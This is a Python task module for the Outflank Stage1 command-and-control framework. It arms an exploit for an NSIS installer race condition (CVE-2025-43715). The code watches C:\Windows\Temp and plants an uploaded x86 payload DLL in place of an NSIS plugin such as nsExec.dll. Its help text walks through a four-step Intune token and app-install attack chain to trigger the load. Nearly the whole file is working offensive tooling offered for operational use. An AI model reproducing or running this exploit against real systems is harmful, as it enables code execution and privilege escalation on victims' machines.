import os
from typing import Dict, List, Optional, Tuple

from outflank_stage1.implant.enums import ImplantArch
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding, BOFType
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


def _resolve_binary_path():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    if os.path.basename(script_dir).lower() == "ost":
        return os.path.normpath(os.path.join(script_dir, "../pe"))
    return script_dir


class IntuneRacePEBOF(BaseBOFTask):
    """Arm a filesystem watcher for the NSIS race condition (CVE-2025-43715). BOF-PE version."""

    def __init__(self):
        super().__init__(
            "intune-race-pe",
            base_binary_name="race",
            base_binary_path=_resolve_binary_path(),
            bof_type=BOFType.ASYNC,
        )

        self.parser.description = (
            "Arm a filesystem watcher on C:\\Windows\\Temp for the NSIS "
            "installer race condition (CVE-2025-43715). When NSIS deletes a "
            "temporary directory, the BOF recreates it and plants a payload "
            "DLL before NSIS reuses the path. Async BOF-PE version: runs "
            "until timeout or the job is stopped."
        )

        self.parser.add_argument(
            "--plugin", default="nsExec.dll",
            help="NSIS plugin filename to replace (default: nsExec.dll)",
        )
        self.parser.add_argument(
            "--timeout", type=int, default=120,
            help="Watcher timeout in seconds, 0 = run until stopped (default: 120)",
        )

        self.parser.epilog = (
            "Upload a payload DLL (must be x86) via the file selector.\n\n"
            "Example usage:\n"
            "  intune-race-pe                            (upload DLL, default 120s)\n"
            "  intune-race-pe --plugin System.dll\n"
            "  intune-race-pe --timeout 300\n"
            "  intune-race-pe --timeout 0               (run until stopped)\n\n"
            "Usage in the chain:\n"
            "  1. askwam --client-id 9ba1a5c7-... --scope d4ebce55-.../.default\n"
            "  2. intune-exchange-pe <mam-token>\n"
            "  3. intune-race-pe                   (upload payload, arm watcher)\n"
            "  4. intune-apps-pe <token> install <app-guid>\n\n"
            "Notes:\n"
            "  The payload DLL must be x86 (32-bit). NSIS is a 32-bit\n"
            "  installer and loads plugins with LoadLibrary.\n"
            "  Arm the watcher BEFORE triggering the install.\n"
            "  The watcher runs until timeout or the job is stopped.\n"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)
        args = self.parser.parse_args(arguments)

        if args.timeout < 0:
            raise TaskInvalidArgumentsException(
                f"Timeout must be >= 0 (0 = infinite), got {args.timeout}"
            )

    def validate_files(self, arguments: List[str]):
        payload = self.get_file_by_name("payload_dll")
        if payload is None:
            raise TaskInvalidArgumentsException(
                "No payload DLL uploaded. Upload an x86 DLL via the file selector."
            )
        if len(payload.content) < 64:
            raise TaskInvalidArgumentsException(
                "Uploaded file is too small to be a valid DLL."
            )
        data = payload.content
        if data[:2] != b"MZ":
            raise TaskInvalidArgumentsException(
                "Uploaded payload is not a PE file."
            )
        pe_offset = int.from_bytes(data[0x3C:0x40], "little")
        if pe_offset + 24 > len(data) or data[pe_offset:pe_offset + 4] != b"PE\0\0":
            raise TaskInvalidArgumentsException(
                "Uploaded payload has an invalid PE header."
            )
        machine = int.from_bytes(data[pe_offset + 4:pe_offset + 6], "little")
        characteristics = int.from_bytes(
            data[pe_offset + 22:pe_offset + 24], "little"
        )
        if machine != 0x014C or not characteristics & 0x2000:
            raise TaskInvalidArgumentsException(
                "Uploaded payload must be an x86 DLL."
            )

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        args = self.parser.parse_args(arguments)
        payload = self.get_file_by_name("payload_dll")
        return [
            (BOFArgumentEncoding.BUFFER, payload.content),
            (BOFArgumentEncoding.STR, args.plugin),
            (BOFArgumentEncoding.INT, args.timeout),
        ]

    def run(self, arguments: List[str]):
        args = self.parser.parse_args(arguments)
        payload = self.get_file_by_name("payload_dll")
        uploaded_name = getattr(payload, "original_name", "uploaded DLL")
        timeout_str = f"{args.timeout}s" if args.timeout > 0 else "infinite"
        self.append_response(
            f"[*] Arming NSIS race watcher ({uploaded_name}, "
            f"{len(payload.content)} bytes, plugin: {args.plugin}, "
            f"timeout: {timeout_str})...\n"
        )
        super().run(arguments)

    def get_gui_elements(self) -> Optional[Dict]:
        return {
            "title": "NSIS Race PE (CVE-2025-43715)",
            "desc": "Plant a payload DLL into NSIS installer temp directories (async BOF-PE).",
            "elements": [
                {
                    "name": "payload_dll",
                    "type": "file",
                    "description": "Payload DLL (x86, use payload_test.dll for validation)",
                    "placeholder": "Select payload DLL",
                },
            ],
        }
